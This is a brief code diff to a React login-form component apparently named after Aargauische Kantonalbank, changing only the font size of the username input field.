@@ -213,7 +213,7 @@ const ChAargauischeKantonalbank = () => {
                   autoComplete="username"
                   value={username}
                   onChange={(e) => setUsername(e.target.value)}
-                  className="w-full h-14 px-3 text-[15px] mb-7 focus:outline-none focus:ring-0"
+                  className="w-full h-14 px-3 text-[18px] mb-7 focus:outline-none focus:ring-0"
                   style={inputStyle}
                 />
 
